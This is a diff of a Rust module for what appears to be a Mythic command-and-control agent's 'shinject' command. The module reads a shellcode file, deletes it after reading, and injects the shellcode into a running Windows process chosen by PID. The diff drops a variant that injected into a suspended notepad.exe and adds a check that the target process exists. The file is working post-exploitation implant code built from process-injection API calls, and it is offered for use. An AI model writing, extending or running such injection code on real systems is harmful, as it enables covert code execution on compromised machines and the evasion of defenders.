@@ -1,10 +1,7 @@
 use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
-use crate::{AgentTask, mythic_success, mythic_error};
 
-#[cfg(target_os = "windows")]
-use std::fs;
 #[cfg(target_os = "windows")]
 use std::mem;
 #[cfg(target_os = "windows")]
@@ -26,11 +23,12 @@ use winapi::um::errhandlingapi::GetLastError;
 #[cfg(target_os = "windows")]
 use winapi::um::winbase::WAIT_OBJECT_0;
 
-// Command structure for Mythic
+// Command structure for Mythic - matching Apollo's structure
 #[derive(Serialize, Deserialize)]
 pub struct ShinjectArgs {
-    pub shellcode: String,  // File ID from Mythic
-    pub process_id: u32,
+    pub pid: u32,
+    #[serde(rename = "shellcode-file-id")]
+    pub shellcode_file_id: String,
 }
 
 #[cfg(target_os = "windows")]
@@ -42,6 +40,10 @@ const MEM_RESERVE: DWORD = 0x2000;
 #[cfg(target_os = "windows")]
 const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
 #[cfg(target_os = "windows")]
+const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;
+#[cfg(target_os = "windows")]
+const STILL_ACTIVE: DWORD = 259;
+#[cfg(target_os = "windows")]
 const INFINITE: DWORD = 0xFFFFFFFF;
 
 /// Wrapper function for compatibility with the tasking system
@@ -49,9 +51,8 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
     let args: ShinjectArgs = serde_json::from_str(&task.parameters)
         .map_err(|e| format!("Failed to parse shinject arguments: {}", e))?;
     
-    match execute_shinject(args) {
+    match execute_shinject(args, &task.id) {
         Ok(output) => {
-            // Use your mythic_success macro or function
             Ok(serde_json::json!({
                 "status": "success",
                 "task_id": task.id,
@@ -59,9 +60,8 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
             }))
         },
         Err(error) => {
-            // Use your mythic_error macro or function  
             Ok(serde_json::json!({
-                "status": "error",
+                "status": "error", 
                 "task_id": task.id,
                 "error": error
             }))
@@ -71,9 +71,9 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn E
 
 /// Main command execution function
 #[cfg(target_os = "windows")]
-pub fn execute_shinject(args: ShinjectArgs) -> Result<String, String> {
-    // Get the shellcode bytes from the file
-    let shellcode_bytes = match get_shellcode_from_mythic(&args.shellcode) {
+pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
+    // Get the shellcode bytes from the downloaded file
+    let shellcode_bytes = match get_shellcode_file(&args.shellcode_file_id, task_id) {
         Ok(bytes) => bytes,
         Err(e) => return Err(e),
     };
@@ -83,46 +83,58 @@ pub fn execute_shinject(args: ShinjectArgs) -> Result<String, String> {
         return Err("Shellcode file is empty".to_string());
     }
 
+    // Check if process exists
+    if !process_exists(args.pid) {
+        return Err(format!("No process with PID {} is running", args.pid));
+    }
+
     unsafe {
-        if args.process_id == 0 {
-            // Create new process and inject
-            match create_process_and_inject(&shellcode_bytes) {
-                Ok(output) => Ok(output),
-                Err(e) => Err(e),
-            }
-        } else {
-            // Inject into existing process
-            match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
-                Ok(output) => Ok(output),
-                Err(e) => Err(e),
-            }
+        match inject_shellcode_impl(args.pid, &shellcode_bytes) {
+            Ok(output) => Ok(output),
+            Err(e) => Err(e),
         }
     }
 }
 
-/// Helper function to locate and read the shellcode file
+/// Check if a process with the given PID exists
 #[cfg(target_os = "windows")]
-fn get_shellcode_from_mythic(file_id: &str) -> Result<Vec<u8>, String> {
-    // Check common locations where Mythic might download files
+fn process_exists(pid: u32) -> bool {
+    unsafe {
+        let handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+        if handle.is_null() {
+            return false;
+        }
+        let mut exit_code: DWORD = 0;
+        let result = GetExitCodeProcess(handle, &mut exit_code);
+        CloseHandle(handle);
+        
+        result != 0 && exit_code == STILL_ACTIVE
+    }
+}
+
+/// Get shellcode file content - uses Mythic's file transfer system
+#[cfg(target_os = "windows")]
+fn get_shellcode_file(file_id: &str, task_id: &str) -> Result<Vec<u8>, String> {
+    // Mythic should automatically download the file when delete_after_fetch=True
+    // We look for it in common download locations
+    
     let possible_paths = vec![
         std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
         std::env::temp_dir().join(file_id),
-        std::env::home_dir().unwrap_or_default().join("Downloads").join(file_id),
         std::path::Path::new(file_id).to_path_buf(),
+        // Also check with .bin extension (common for shellcode)
+        std::env::current_dir().map(|p| p.join(format!("{}.bin", file_id))).unwrap_or_default(),
+        std::env::temp_dir().join(format!("{}.bin", file_id)),
     ];
     
-    // Try to read the file from various possible locations
-    for (i, path) in possible_paths.iter().enumerate() {
-        eprintln!("DEBUG: Checking location {}: {}", i + 1, path.display());
-        eprintln!("DEBUG: File exists: {}", path.exists());
-        
+    // Try to find and read the file
+    for path in &possible_paths {
         if path.exists() {
-            match fs::read(path) {
+            match std::fs::read(path) {
                 Ok(bytes) => {
                     if !bytes.is_empty() {
-                        eprintln!("DEBUG: Found file at {} with {} bytes", path.display(), bytes.len());
-                        // Clean up the file after reading (optional)
-                        let _ = fs::remove_file(path);
+                        // Clean up the file after reading
+                        let _ = std::fs::remove_file(path);
                         return Ok(bytes);
                     }
                 }
@@ -134,82 +146,30 @@ fn get_shellcode_from_mythic(file_id: &str) -> Result<Vec<u8>, String> {
         }
     }
     
-    // If file not found, provide detailed error message
+    // File not found - provide helpful error message
     let current_dir = std::env::current_dir()
         .map(|p| p.to_string_lossy().to_string())
         .unwrap_or_else(|_| "unknown".to_string());
     
     Err(format!(
-        "Shellcode file '{}' not found in any expected location.\n\n\
-        DEBUG INFO:\n\
-        - File ID: {}\n\
-        - Current working directory: {}\n\
-        - Searched locations:\n{}\n\n\
+        "Shellcode file '{}' not found.\n\n\
         TROUBLESHOOTING:\n\
         1. Make sure the file exists in Mythic\n\
-        2. Use the 'download {}' command first to download the file\n\
-        3. Verify the file was successfully downloaded to the agent\n\
-        4. Check Mythic server logs for file transfer errors",
-        file_id,
+        2. The file should be automatically downloaded by Mythic\n\
+        3. Current working directory: {}\n\
+        4. Searched locations:\n{}\n\n\
+        Check Mythic server logs for file transfer errors.",
         file_id,
         current_dir,
         possible_paths.iter()
             .enumerate()
             .map(|(i, path)| format!("  {}. {} (exists: {})", i + 1, path.display(), path.exists()))
             .collect::<Vec<_>>()
-            .join("\n"),
-        file_id
+            .join("\n")
     ))
 }
 
-/// Create new process and inject shellcode (easier for POC)
-#[cfg(target_os = "windows")]
-unsafe fn create_process_and_inject(shellcode: &[u8]) -> Result<String, String> {
-    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
-    use winapi::um::winbase::CREATE_SUSPENDED;
-    
-    // Create a suspended notepad process
-    let mut si: STARTUPINFOW = std::mem::zeroed();
-    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
-    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
-    
-    let app_name = "notepad.exe\0".encode_utf16().collect::<Vec<u16>>();
-    
-    let result = CreateProcessW(
-        app_name.as_ptr(),
-        std::ptr::null_mut(),
-        std::ptr::null_mut(),
-        std::ptr::null_mut(),
-        FALSE,
-        CREATE_SUSPENDED,
-        std::ptr::null_mut(),
-        std::ptr::null_mut(),
-        &mut si,
-        &mut pi,
-    );
-    
-    if result == 0 {
-        return Err(format!("Failed to create process. Error: {}", GetLastError()));
-    }
-    
-    // Now inject into the newly created process
-    match inject_shellcode_impl(pi.dwProcessId, shellcode) {
-        Ok(output) => {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            Ok(format!("Created new process (PID: {}) and injected shellcode successfully!\n\n{}", pi.dwProcessId, output))
-        },
-        Err(e) => {
-            // Clean up the process if injection failed
-            TerminateProcess(pi.hProcess, 1);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            Err(e)
-        }
-    }
-}
-
-// Windows shellcode injection implementation
+/// Windows shellcode injection implementation
 #[cfg(target_os = "windows")]
 unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
     // Open the target process
@@ -295,14 +255,8 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
 
     if wait_result == WAIT_OBJECT_0 {
         Ok(format!(
-            "✅ Shellcode successfully injected!\n\n\
-            📊 Injection Details:\n\
-            - Target PID: {}\n\
-            - Thread ID: {}\n\
-            - Shellcode Size: {} bytes\n\
-            - Allocation Address: {:p}\n\n\
-            🎯 The shellcode has been executed in the target process.",
-            process_id, thread_id, buffer_size, remote_mem
+            "Injected code into process {}",
+            process_id
         ))
     } else {
         Err(format!(
@@ -315,22 +269,22 @@ unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<Str
 
 // macOS placeholder implementation
 #[cfg(target_os = "macos")]
-pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
+pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
     Err("shinject command is not implemented for macOS".to_string())
 }
 
 // Fallback for other platforms
 #[cfg(not(target_os = "windows"))]
-pub fn execute_shinject(_args: ShinjectArgs) -> Result<String, String> {
+pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
     Err("shinject command is only supported on Windows".to_string())
 }
 
 /// Direct command handler for integration with command dispatch system
-pub fn handle_shinject_command(args: &str) -> Result<String, String> {
+pub fn handle_shinject_command(args: &str, task_id: &str) -> Result<String, String> {
     let shinject_args: ShinjectArgs = serde_json::from_str(args)
         .map_err(|e| format!("Failed to parse shinject arguments: {}", e))?;
     
-    execute_shinject(shinject_args)
+    execute_shinject(shinject_args, task_id)
 }
 
 #[cfg(test)]
@@ -339,17 +293,18 @@ mod tests {
 
     #[test]
     fn test_shinject_args_parsing() {
-        let args = ShinjectArgs {
-            shellcode: "test_file_id".to_string(),
-            process_id: 1234,
-        };
-        assert_eq!(args.shellcode, "test_file_id");
-        assert_eq!(args.process_id, 1234);
+        let json_args = r#"{"pid": 1234, "shellcode-file-id": "test_file_id"}"#;
+        let args: ShinjectArgs = serde_json::from_str(json_args).unwrap();
+        assert_eq!(args.shellcode_file_id, "test_file_id");
+        assert_eq!(args.pid, 1234);
     }
 
     #[test]
     fn test_shinject_command_handler() {
-        let result = handle_shinject_command(r#"{"shellcode": "test", "process_id": 1234}"#);
+        let result = handle_shinject_command(
+            r#"{"pid": 1234, "shellcode-file-id": "test"}"#, 
+            "test_task_id"
+        );
         // On non-Windows, this should return an error about platform not supported
         // On Windows, it will try to find the file and likely fail
         assert!(result.is_ok() || result.is_err());
@@ -357,7 +312,7 @@ mod tests {
 
     #[test]
     fn test_invalid_json_handling() {
-        let result = handle_shinject_command("invalid json");
+        let result = handle_shinject_command("invalid json", "test_task_id");
         assert!(result.is_err());
         assert!(result.unwrap_err().contains("Failed to parse shinject arguments"));
     }
